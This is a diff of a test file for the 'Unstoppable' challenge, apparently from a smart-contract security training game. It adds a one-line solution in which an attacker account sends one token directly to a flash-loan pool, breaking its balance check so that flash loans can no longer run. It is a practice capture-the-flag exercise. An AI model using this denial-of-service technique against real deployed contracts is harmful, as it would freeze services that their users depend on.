@@ -37,9 +37,11 @@ describe('[Challenge] Unstoppable', function () {
          this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
          await this.receiverContract.executeFlashLoan(10);
     });
-
+    
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //Send 1 token to the pool to break require check rendering it impossible to execute flash loan
+        await this.token.connect(attacker).transfer(this.pool.address,1);
     });
 
     after(async function () {
